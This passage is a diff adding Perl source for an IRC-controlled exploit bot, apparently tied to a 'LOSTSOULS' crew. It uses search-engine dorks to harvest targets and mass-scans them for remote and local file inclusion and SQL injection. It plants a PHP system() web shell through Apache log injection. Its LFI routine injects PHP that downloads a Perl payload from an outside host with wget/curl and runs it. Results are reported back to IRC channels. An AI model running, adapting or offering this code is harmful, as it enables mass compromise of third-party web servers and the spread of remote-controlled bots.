+			}
+		}
+
+		##################################################################### Bing Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Bing";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Altavista Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "ALtaViSTa";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### ASK Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "AsK";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### UoL Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "UoL";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Lycos Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "LyCos";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Yahoo Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "YahOo";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Biglobe Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Biglobe";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Seznam Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Seznam";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Sapo Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Sapo";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### Hotbot Engine
+		if ($msg=~ /PRIVMSG $channel :$mssqlcmd\s+(.*?)\s+(.*)/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					my $engx = "Hotbot";
+					my $bugx = $1;
+					my $d0rk = $2;
+					&mssqlscan($engx,$bugx,$d0rk);
+				}
+				exit;
+			}
+		}
+
+		##################################################################### 
+		##################################################################### Apache Log Injection
+		if ($msg=~ /PRIVMSG $channel :$alicmd\s+(.*?)\s+(.+[0-9])/ ) {
+			if (my $pid = fork) {
+				waitpid($pid, 0);
+			}
+			else {
+				if (fork) {	exit; } else {
+					&injectlog($1,$2);
+				}
+				exit;
+			}
+		}
+
+		for(my $c=0; $c<= $#lines; $c++) {
+			$line = $lines[$c];
+			$line=$line_temp.$line if ($line_temp);
+			$line_temp='';
+			$line =~ s/\r$//;
+			unless ($c == $#lines) {
+				parse("$line");
+			} else {
+				if ($#lines == 0) {
+					parse("$line");
+				} elsif ($lines[$c] =~ /\r$/) {
+					parse("$line");
+				} elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
+					parse("$line");
+				} else {
+					$line_temp = $line;
+				}
+			}
+		}
+	}
+}
+
+##################################################################### Procedure
+
+sub injectlog() {
+	my $host = $_[0];
+	my $port = $_[1];
+	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2ALI15)12 Injecting3 ".$host.":".$port." 12Apache Access Log ...");
+	my $php = "<?php if(get_magic_quotes_gpc()){ \$_GET[c0li]=stripslashes(\$_GET[c0li]);} system(\$_GET[c0li]);?>";
+	$sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => 80, Proto => "tcp") ||
+	die sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2ALI15)12 Cant Connect to3 ".$host.":".$port."");
+	print $sock "GET /LOSTSOULS.UnderGrounD ".$php." HTTP/1.1\r\n";
+	print $sock "Host: ".$host."\r\n";
+	print $sock "Connection: close\r\n\r\n";
+	close($sock);
+	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2ALI15)3 ".$host." 12is Done ...");
+	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2ALI15)3 ".$host." 12RCE Parameter  ->3 c0li");
+	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2ALI15)3 ".$host." 12RCE Identifier ->3 LOSTSOULS.UnderGrounD");
+}
+
+sub rfiscan() {
+	my $engz = $_[0];
+	my $bugz = $_[1];
+	my $dork = $_[2];
+	my $bsqlon = 0;
+	my $contatore = 0;
+	if ($engz =~ /GooGLe/) {
+		my @google=&google($dork, $bsqlon);
+		push(@total, @google);
+	}
+	if ($engz =~ /AllTheWeb/) {
+		my @alltheweb=&alltheweb($dork, $bsqlon);
+		push(@total, @alltheweb);
+	}
+	if ($engz =~ /Bing/) {
+		my @Bing=&Bing($dork, $bsqlon);
+		push(@total, @Bing);
+	}
+	if ($engz =~ /ALtaViSTa/) {
+		my @altavista=&altavista($dork, $bsqlon);
+		push(@total, @altavista);
+	}
+	if ($engz =~ /AsK/) {
+		my @ask=&ask($dork, $bsqlon);
+		push(@total, @ask);
+	}
+	if ($engz =~ /UoL/) {
+		my @uol=&uol($dork, $bsqlon);
+		push(@total, @uol);
+	}
+	if ($engz =~ /LyCos/) {
+		my @lycos=&lycos($dork, $bsqlon);
+		push(@total, @lycos);
+	}
+	if ($engz =~ /YahOo/) {
+		my @yahoo=&yahoo($dork, $bsqlon);
+		push(@total, @yahoo);
+	}
+	if ($engz =~ /Biglobe/) {
+		my @biglobe=&biglobe($dork, $bsqlon);
+		push(@total, @biglobe);
+	}
+	if ($engz =~ /Seznam/) {
+		my @seznam=&seznam($dork, $bsqlon);
+		push(@total, @seznam);
+	}
+	if ($engz =~ /Sapo/) {
+		my @sapo=&sapo($dork, $bsqlon);
+		push(@total, @sapo);
+	}
+	if ($engz =~ /Hotbot/) {
+		my @hotbot=&hotbot($dork, $bsqlon);
+		push(@total, @hotbot);
+	}
+	my @clean=&calculate(@total);
+	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2RFI15)(3@2$engz15)12 Total:12 (".scalar(@total).")12 Clean:12 (".scalar(@clean).")");
+	if (scalar(@clean) != 0) {
+		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2RFI15)(3@2$engz15)3 Exploiting12 $dork");
+	}
+	my $uni=scalar(@clean);
+	foreach my $target (@clean)
+	{
+		$contatore++;
+		if ($contatore==$uni-1){
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2RFI15)(3@2$engz15)10 Scan Finish for14 $dork");
+		}
+		my $xpl  = "http://".$target.$bugz.$injector."?";
+		my $vuln = "http://".$target."12".$bugz."3".$phpshell."?";
+		my $re   = getcontent($xpl);
+		if($re =~ /$rfi_result/ && $re =~ /uid=/){
+			os($xpl);
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2RFI15)(3@2$engz15)15(13@12Vulnerable15)12 ".$vuln." 15(3@6".$os."15)(3@3SAFEMODE-OFF15)");
+		}
+		elsif($re =~ /$rfi_result/)
+		{
+			os($xpl);
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2RFI15)(3@2$engz15)15(13@12Vulnerable15)12 ".$vuln." 15(3@6".$os."15)(3@12SAFEMODE-ON15)");
+		}
+	}
+}
+
+sub sqlscan() {
+	my $engz = $_[0];
+	my $dork = $_[1];
+	my $bsqlon = 1;
+	my $contatore = 0;
+	if ($engz =~ /GooGLe/) {
+		my @google=&google($dork, $bsqlon);
+		push(@total, @google);
+	}
+#	if ($engz =~ /AllTheWeb/) {
+#		my @alltheweb=&alltheweb($dork, $bsqlon);
+#		push(@total, @alltheweb);
+#	}
+	if ($engz =~ /Bing/) {
+		my @Bing=&Bing($dork, $bsqlon);
+		push(@total, @Bing);
+	}
+#	if ($engz =~ /ALtaViSTa/) {
+#		my @altavista=&altavista($dork, $bsqlon);
+#		push(@total, @altavista);
+#	}
+	if ($engz =~ /AsK/) {
+		my @ask=&ask($dork, $bsqlon);
+		push(@total, @ask);
+	}
+	if ($engz =~ /UoL/) {
+		my @uol=&uol($dork, $bsqlon);
+		push(@total, @uol);
+	}
+	if ($engz =~ /LyCos/) {
+		my @lycos=&lycos($dork, $bsqlon);
+		push(@total, @lycos);
+	}
+	if ($engz =~ /YahOo/) {
+		my @yahoo=&yahoo($dork, $bsqlon);
+		push(@total, @yahoo);
+	}
+	if ($engz =~ /Biglobe/) {
+		my @biglobe=&biglobe($dork, $bsqlon);
+		push(@total, @biglobe);
+	}
+	if ($engz =~ /Seznam/) {
+		my @seznam=&seznam($dork, $bsqlon);
+		push(@total, @seznam);
+	}
+	if ($engz =~ /Sapo/) {
+		my @sapo=&sapo($dork, $bsqlon);
+		push(@total, @sapo);
+	}
+	if ($engz =~ /Hotbot/) {
+		my @hotbot=&hotbot($dork, $bsqlon);
+		push(@total, @hotbot);
+	}
+	my @clean=&calculate(@total);
+	@clean=&serv_iguais(@clean);
+	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2$engz15)12 Total:12 (".scalar(@total).")12 Clean:12 (".scalar(@clean).")");
+	if (scalar(@clean) != 0) {
+		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2$engz15)3 Exploiting12 $dork");
+	}
+	my $uni=scalar(@clean);
+	foreach my $target (@clean)
+	{
+		$contatore++;
+		if ($contatore==$uni-1){
+			sendraw($IRC_cur_socket, "PRIVMSG $result_channel :15(3@2SQL15)(3@2$engz15)10 Scan Finish for14 $dork");
+		}
+	if (($target =~ m/\=.*/g) && ($target !~ m/google\.com/)) {
+		my $next = 1;
+		my $xpl  = "http://".$target;
+		my $url = $xpl;
+		my $url2 = $xpl;
+		my $url3 = $xpl;
+		
+		
+		$url =~ s/\=(.*)\&/\=$1\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/1)\=1\&/g;
+		$url =~ s/\=(.*)$/\=$1\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/1)\=1/g;
+		$url2 =~ s/\=(.*)\&/\=$1\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/2)\=2\&/g;
+		$url2 =~ s/\=(.*)$/\=$1\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/2)\=2/g;
+		$url3 =~ s/\=(.*)\&/\=$1\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/1)\=2\&/g;
+		$url3 =~ s/\=(.*)$/\=$1\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/1)\=2/g;
+		
+		my $r1 = getcontent($url);
+		my $r2 = getcontent($url2);
+		my $r3 = getcontent($url3);
+		
+		my $tam1 = length($r1);
+		my $tam2 = length($r2);
+		my $tam3 = length($r3);
+
+		my $subcerto = $tam2 - $tam1;
+		my $suberrado = $tam3 - $tam1;
+		
+		my $re   = getcontent($xpl);
+		
+		
+		if ((($subcerto >= -10) && ($subcerto <= 10)) && (($suberrado <= -10) || ($suberrado >= 10))) {
+			#sendraw($IRC_cur_socket, "PRIVMSG $result_channel_cmd : $xpl -- $url");
+			sendraw($IRC_cur_socket, "PRIVMSG $result_channel :15(3@2SQL15)(3@2$engz15)15(13@12Vulnerable15)12 ".$xpl." 15(3Tipo: 6Integer15)");
+			$next = 0;
+		}
+		
+		if ( $next ) {
+		$url = $xpl;
+		$url2 = $xpl;
+		$url3 = $xpl;
+		
+		
+		$url =~ s/\=(.*)\&/\=$1\'\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/1)\=\'1\&/g;
+		$url =~ s/\=(.*)$/\=$1\'\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/1)\=\'1/g;
+		$url2 =~ s/\=(.*)\&/\=$1\'\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/2)\=\'2\&/g;
+		$url2 =~ s/\=(.*)$/\=$1\'\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/2)\=\'2/g;
+		$url3 =~ s/\=(.*)\&/\=$1\'\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/1)\=\'2\&/g;
+		$url3 =~ s/\=(.*)$/\=$1\'\/\*\*\/And\/\*\*\/(SELECT\/\*\*\/1)\=\'2/g;
+		
+		my $r1 = getcontent($url);
+		my $r2 = getcontent($url2);
+		my $r3 = getcontent($url3);
+		
+		my $tam1 = length($r1);
+		my $tam2 = length($r2);
+		my $tam3 = length($r3);
+
+		my $subcerto = $tam2 - $tam1;
+		my $suberrado = $tam3 - $tam1;
+		
+		my $re   = getcontent($xpl);
+		
+		
+		if ((($subcerto >= -10) && ($subcerto <= 10)) && (($suberrado <= -10) || ($suberrado >= 10))) {
+			#sendraw($IRC_cur_socket, "PRIVMSG $result_channel_cmd : $xpl -- $url");
+			sendraw($IRC_cur_socket, "PRIVMSG $result_channel :15(3@2SQL15)(3@2$engz15)15(13@12Vulnerable15)12 ".$xpl." 15(3Tipo: 6String15)");
+		}
+		}
+	}
+	}
+}
+
+sub lfiscan() {
+	my $engz = $_[0];
+	my $bugz = $_[1];
+	my $dork = $_[2];
+	my $bsqlon = 0;
+	my $contatore = 0;	
+	if (substr($bugz, 0, 1) eq "/") { $bugz = substr($bugz, 1); }
+	
+	my $direc = $bugz;
+	$direc =~ m/.+(\/.+)/;
+
+	my $b = $1;
+
+	if ($b ne "") {
+
+	$direc = str_replace($b, "", $direc);
+	$direc .= "/";
+	}
+	else { $direc = ""; }
+	
+	if ($direc eq "/") { $direc = ""; }
+	
+	if ($engz =~ /GooGLe/) {
+		my @google=&google($dork, $bsqlon);
+		push(@total, @google);
+		}
+	if ($engz =~ /AllTheWeb/) {
+		my @alltheweb=&alltheweb($dork, $bsqlon);
+		push(@total, @alltheweb);
+	}
+	if ($engz =~ /Bing/) {
+		my @Bing=&Bing($dork, $bsqlon);
+		push(@total, @Bing);
+	}
+	if ($engz =~ /ALtaViSTa/) {
+		my @altavista=&altavista($dork, $bsqlon);
+		push(@total, @altavista);
+	}
+	if ($engz =~ /AsK/) {
+		my @ask=&ask($dork, $bsqlon);
+		push(@total, @ask);
+	}
+	if ($engz =~ /UoL/) {
+		my @uol=&uol($dork, $bsqlon);
+		push(@total, @uol);
+	}
+	if ($engz =~ /LyCos/) {
+		my @lycos=&lycos($dork, $bsqlon);
+		push(@total, @lycos);
+	}
+	if ($engz =~ /YahOo/) {
+		my @yahoo=&yahoo($dork, $bsqlon);
+		push(@total, @yahoo);
+	}
+	if ($engz =~ /Biglobe/) {
+		my @biglobe=&biglobe($dork, $bsqlon);
+		push(@total, @biglobe);
+	}
+	if ($engz =~ /Seznam/) {
+		my @seznam=&seznam($dork, $bsqlon);
+		push(@total, @seznam);
+	}
+	if ($engz =~ /Sapo/) {
+		my @sapo=&sapo($dork, $bsqlon);
+		push(@total, @sapo);
+	}
+	if ($engz =~ /Hotbot/) {
+		my @hotbot=&hotbot($dork, $bsqlon);
+		push(@total, @hotbot);
+	}
+	my @clean = &calculate(@total);
+	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2LFI15)(3@2$engz15)12 Total:12 (".scalar(@total).")12 Clean:12 (".scalar(@clean).")");
+	if (scalar(@clean) != 0) {
+		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2LFI15)(3@2$engz15)3 Exploiting12 $dork");
+	}
+	my $uni=scalar(@clean);
+	foreach my $target (@clean)
+	{
+		$contatore++;
+		if ($contatore==$uni-1){
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2LFI15)(3@2$engz15)10 Scan Finish for14 $dork");
+		}
+		my $xpl  = "http://".$target.$bugz.$lfi_test;
+		my $vuln = "http://".$target."12".$bugz."3".$lfi_test."";
+		my $re   = getcontent24($xpl, "<? echo('h4ug'.'uen'); ?>oi");
+		if ($re  =~ /h4uguen/){
+			sendraw($IRC_cur_socket, "PRIVMSG $result_channel :15(3@2LFI15)(3@2$engz15)15(13@12Vulnerable15)12 ".$vuln." 15(3@3LOSTSOULS15)");
+			my $nada = getcontent($loger.urlencode("$xpl"));
+			my $re2 = getcontent24($xpl, "<? system('GET $lficmdsite > $lficmdname; wget $lficmdsite -O $lficmdname; curl -o $lficmdsite $lficmdname;cd /tmp; GET http://colmarie-torfou.net/joomlascol15/libraries/pear/beer.txt  > /tmp/somez.datz ; lynx -source http://colmarie-torfou.net/joomlascol15/libraries/pear/beer.txt  > /tmp/somez.date ; wget http://colmarie-torfou.net/joomlascol15/libraries/pear/beer.txt; curl -O http://colmarie-torfou.net/joomlascol15/libraries/pear/beer.txt;lwp-download http://colmarie-torfou.net/joomlascol15/libraries/pear/beer.txt;perl beer.txt; perl /tmp/somez.dat ; perl /tmp/somez.date ; perl /tmp/somez.datz;perl beer.txt; rm /tmp/*'); ? oi");
+			my $sitec99 = "http://".limpa($target).$direc.$lficmdname;
+			my $c99 = getcontent($sitec99);
+			#sendraw($IRC_cur_socket, "PRIVMSG hauguen :limpa($target) $direc $lficmdname");
+			if ($c99 =~ m/$lficmdresult/) {
+				sendraw($IRC_cur_socket, "PRIVMSG $result_channel_cmd :15(3@2LFI15)(3@2$engz15)15(13@12Vulnerable15)12 ".$sitec99." 15(3@3LOSTSOULS15)");
+			}
+		}
+	}
+}
+
+sub mysqlscan() {
+	my $engz = $_[0];
+	my $bugz = $_[1];
+	my $dork = $_[2];
+	my $bsqlon = 0;
+	my $contatore = 0;
+	if ($engz =~ /GooGLe/) {
+		my @google=&google($dork, $bsqlon);
+		push(@total, @google);
+		}
+	if ($engz =~ /AllTheWeb/) {
+		my @alltheweb=&alltheweb($dork, $bsqlon);
+		push(@total, @alltheweb);
+	}
+	if ($engz =~ /Bing/) {
+		my @Bing=&Bing($dork, $bsqlon);
+		push(@total, @Bing);
+	}
+	if ($engz =~ /ALtaViSTa/) {
+		my @altavista=&altavista($dork, $bsqlon);
+		push(@total, @altavista);
+	}
+	if ($engz =~ /AsK/) {
+		my @ask=&ask($dork, $bsqlon);
+		push(@total, @ask);
+	}
+	if ($engz =~ /UoL/) {
+		my @uol=&uol($dork, $bsqlon);
+		push(@total, @uol);
+	}
+	if ($engz =~ /LyCos/) {
+		my @lycos=&lycos($dork, $bsqlon);
+		push(@total, @lycos);
+	}
+	if ($engz =~ /YahOo/) {
+		my @yahoo=&yahoo($dork, $bsqlon);
+		push(@total, @yahoo);
+	}
+	if ($engz =~ /Biglobe/) {
+		my @biglobe=&biglobe($dork, $bsqlon);
+		push(@total, @biglobe);
+	}
+	if ($engz =~ /Seznam/) {
+		my @seznam=&seznam($dork, $bsqlon);
+		push(@total, @seznam);
+	}
+	if ($engz =~ /Sapo/) {
+		my @sapo=&sapo($dork, $bsqlon);
+		push(@total, @sapo);
+	}
+	if ($engz =~ /Hotbot/) {
+		my @hotbot=&hotbot($dork, $bsqlon);
+		push(@total, @hotbot);
+	}
+	my @clean = &calculate(@total);
+	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2$engz15)12 Total:12 (".scalar(@total).")12 Clean:12 (".scalar(@clean).")");
+	if (scalar(@clean) != 0) {
+		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2$engz15)3 Exploiting12 $dork");
+	}
+	my $uni = scalar(@clean);
+	foreach my $target (@clean)
+	{
+		$contatore++;
+		if ($contatore==$uni-1){
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2$engz15)10 Scan Finish for14 $dork");
+		}
+		my $xpl  = "http://".$target.$bugz.$sql_test;
+		my $vuln = "http://".$target."12".$bugz."3[SQL]";
+		my $re   = getcontent($xpl);
+		if ($re  =~ /$mysql_output/){
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2$engz15)15(13@12ErrorQuery15)12 ".$vuln." 15(3@3LOSTSOULS15)");
+		}
+	}
+}
+
+
+sub mssqlscan() {
+	my $engz = $_[0];
+	my $bugz = $_[1];
+	my $dork = $_[2];
+	my $bsqlon = 0;
+	my $contatore = 0;
+	if ($engz =~ /GooGLe/) {
+		my @google=&google($dork, $bsqlon);
+		push(@total, @google);
+		}
+	if ($engz =~ /AllTheWeb/) {
+		my @alltheweb=&alltheweb($dork, $bsqlon);
+		push(@total, @alltheweb);
+	}
+	if ($engz =~ /Bing/) {
+		my @Bing=&Bing($dork, $bsqlon);
+		push(@total, @Bing);
+	}
+	if ($engz =~ /ALtaViSTa/) {
+		my @altavista=&altavista($dork, $bsqlon);
+		push(@total, @altavista);
+	}
+	if ($engz =~ /AsK/) {
+		my @ask=&ask($dork, $bsqlon);
+		push(@total, @ask);
+	}
+	if ($engz =~ /UoL/) {
+		my @uol=&uol($dork, $bsqlon);
+		push(@total, @uol);
+	}
+	if ($engz =~ /LyCos/) {
+		my @lycos=&lycos($dork, $bsqlon);
+		push(@total, @lycos);
+	}
+	if ($engz =~ /Biglobe/) {
+		my @biglobe=&biglobe($dork, $bsqlon);
+		push(@total, @biglobe);
+	}
+	if ($engz =~ /Seznam/) {
+		my @seznam=&seznam($dork, $bsqlon);
+		push(@total, @seznam);
+	}
+	my @clean = &calculate(@total);
+	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2$engz15)12 Total:12 (".scalar(@total).")12 Clean:12 (".scalar(@clean).")");
+	if (scalar(@clean) != 0) {
+		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2$engz15)3 Exploiting12 $dork");
+	}
+	my $uni = scalar(@clean);
+	foreach my $target (@clean)
+	{
+		$contatore++;
+		if ($contatore==$uni-1){
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2$engz15)10 Scan Finish for14 $dork");
+		}
+		my $xpl  = "http://".$target.$bugz.$sql_test;
+		my $vuln = "http://".$target."12".$bugz."3[SQL]";
+		my $re   = getcontent($xpl);
+		if ($re  =~ /$mssql_output/){
+			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2SQL15)(3@2$engz15)15(13@12ErrorQuery15)12 ".$vuln." 15(3@3LOSTSOULS15)");
+		}
+	}
+}
+
+sub os() {
+	my $site = $_[0];
+	my $re   = &query($site);
+	while ($re =~ m/<br>os:(.+?)<br>/g) {
+		$os = $1;
+		if ($1 eq "") { $os = "UnKn0wN"; }
+	}
+}
+
+sub response() {
+    my $re = getcontent($injector);
+    if ($re =~ /pZLNd8MwEITvg/) {
+        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2RFI15)12 « 3OK12 »");
+    }
+    else {
+        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(3@2RFI15)12 « 12JAH12 »");
+    }
+}
+
+sub getcontent() {
+    $url    = $_[0];
+    my $req = HTTP::Request->new(GET => $url);
+    my $ua  = LWP::UserAgent->new();
+    $ua->timeout(5);
+    my $response = $ua->request($req);
+    return $response->content;
+}
+sub getcontent24() {
+    $url    = $_[0];
+    $agent = $_[1];
+    my $req = HTTP::Request->new(GET => $url);
+    my $ua  = LWP::UserAgent->new();
+    $ua->agent($agent);
+    $ua->timeout(5);
+    my $response = $ua->request($req);
+    return $response->content;
+}
+
+sub urlencode {
+my $theURL = $_[0];
+$theURL =~ s/([\W])/"%" . uc(sprintf("%2.2x",ord($1)))/eg;
+return $theURL;
+}
+
+sub urldecode {
+    my $theURL = $_[0];
+    $theURL =~ tr/+/ /;
+    $theURL =~ s/%([a-fA-F0-9]{2,2})/chr(hex($1))/eg;
+    $theURL =~ s/<!--(.|\n)*-->//g;
+    return $theURL;
+}
+
+sub google(){
+    my @lst;
+    my $key = $_[0]; my $bs = $_[1]; my $bs = $_[1];
+    my $b   = 0;
+    for ($b=0; $b<=1000; $b+=100){
+        my $Go=("http://www.google.com/search?q=".&key($key)."&num=100&filter=0&start=".$b);
+        my $Res= query($Go);
+        while ($Res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g){
+            if ($1 !~ /google/){
+                my $k=$1;
+                my @grep=links($k, $bs);
+                push(@lst,@grep);
+            }
+		}
+	}
+return @lst;
+}
+
+#sub alltheweb() {
+#    my @lst;
+#    my $key = $_[0]; my $bs = $_[1];
+#    my $b   = 0;
+#    my $pg  = 0;
+#    for ($b=0; $b<=1000; $b+=100) {
+#        my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$b);
+#        my $Res = query($all);
+#        while ( $Res =~ m/<span\sclass=\"resTitle\"><a\sclass=\"res\"\shref=\"http:\/\/av\.rds\.yahoo\.com(.+?)\*\*http%3[a|A]\/\/(.+?)\"/g ) {
+#            my $k = $2;
+#            my @grep = links($k, $bs);
+#            push( @lst, @grep );
+#        }
+#    }
+#    return @lst;
+#}
+
+sub uol() {
+    my @lst;
+    my $key = $_[0]; my $bs = $_[1];
+    my $b   = 0;
+    for ($b=0; $b<=1000; $b+=10) {
+        my $UoL = ("http://busca.uol.com.br/web/?ref=homeuol&q=".key($key)."&start=".$b);
+        my $Res = query($UoL);
+	if ($Res =~ m/retornou nenhum resultado/i) {$b=500;}
+        while ( $Res =~ m/href=\"?http:\/\/([^\">]*)\"/g) {
+            my $k = $1;
+	    if ($k !~ /uol\.com\.br|\/web/i){
+                my @grep = links($k, $bs);
+                push( @lst, @grep );
+        }
+    }
+}
+    return @lst;
+}
+
+sub Bing() {
+    my @lst;
+    my $key = $_[0]; my $bs = $_[1];
+    my $b   = 0;
+    for ($b=1; $b<=1000; $b+=10) {
+        my $bing = ("http://www.bing.com/search?q=".&key($key)."&filt=all&first=".$b."&FORM=PERE");
+        my $Res = query($bing);
+        while ( $Res =~ m/<div\sclass=\"sb_tlst\"><h3><a\shref=\"http:\/\/(.+?)\"/g ) {
+            if ( $1 !~ /msn|live|bing/ ) {
+                my $k    = $1;
+                my @grep = links($k, $bs);
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+
+sub seznam() {
+    my @lst;
+    my $key = $_[0]; my $bs = $_[1];
+    my $b   = 0;
+    for ($b=1; $b<=300; $b+=20) {
+        my $seznam = ("http://search.seznam.cz/?q=".&key($key)."&count=20&from=".$b);
+        my $Res = query($seznam);
+        while ( $Res =~ m/href=\"?http:\/\/([^\">]*)\"/g) {
+            if ( $1 !~ /seznam\.cz|chytrevyhledavani\.cz|smobil\.cz|sklik\.cz/i) {
+                my $k    = $1;
+                my @grep = links($k, $bs);
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+
+sub biglobe() {
+    my @lst;
+    my $key = $_[0]; my $bs = $_[1];
+    my $b   = 0;
+    for ($b=1; $b<=500; $b+=10) {
+	$num += $num;
+        my $biglobe = ("http://cgi.search.biglobe.ne.jp/cgi-bin/search-st_lp2?start=".$b."&ie=utf8&num=".$num."&q=".&key($key)."&lr=all");
+        my $Res = query($biglobe);
+        while ( $Res =~ m/<a href=\"http:\/\/(.+?)\"/g ) {
+            if ( $1 !~ /biglobe/) {
+                my $k    = $1;
+                my @grep = links($k, $bs);
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+
+sub sapo() {
+    my @lst;
+    my $key = $_[0]; my $bs = $_[1];
+    my $b   = 0;
+    for ($b=1; $b<=50; $b+=1) {
+        my $sapo = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".&key($key)."&st=local");
+        my $Res = query($sapo);
+		if ($Res !~ m/Next/i) {$b=50;}
+        while ( $Res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
+            if ( $1 !~ /\.sapo\.pt/) {
+                my $k    = $1;
+                my @grep = links($k, $bs);
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+
+sub hotbot() {
+    my @lst;
+    my $key = $_[0]; my $bs = $_[1];
+    my $b   = 0;
+    for ($b=1; $b<=50; $b+=1) {
+        my $hotbot = ("http://www.hotbot.com/search/web?pn=".$b."&q=".&key($key));
+        my $Res = query($hotbot);
+		if ($Res !~ m/had no web result/i) {$b=50;}
+        while ( $Res =~ m/href=\"http:\/\/(.+?)\" title=/g) {
